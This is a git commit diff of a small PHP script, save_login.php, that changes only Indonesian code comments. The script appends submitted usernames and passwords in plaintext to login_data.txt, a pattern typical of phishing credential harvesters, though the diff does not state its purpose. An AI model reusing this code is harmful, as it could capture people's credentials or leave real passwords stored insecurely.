79f3224203c357d98a839b7b43732918d1580bdc
Rizzzky <114666981+Rizzzky@users.noreply.github.com>
2023-07-24 01:43:17 +0700

    Update save_login.php

--- save_login.php
+++ save_login.php
@@ -3,16 +3,16 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    // Buat string data yang akan disimpan ke dalam file teks
+    // Buat string data yang akan disimpan ke dalam file notepad
     $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";
 
-    // Buka file teks untuk menambahkan data login
+    // Buka file notepad untuk menambahkan data login
     $file = fopen("login_data.txt", "a");
 
-    // Tulis data login ke dalam file teks
+    // Tulis data login ke dalam file notepad
     fwrite($file, $data);
 
-    // Tutup file teks setelah selesai menulis
+    // Tutup file notepad setelah selesai menulis
     fclose($file);
 
     // Beri respon kembali ke halaman login
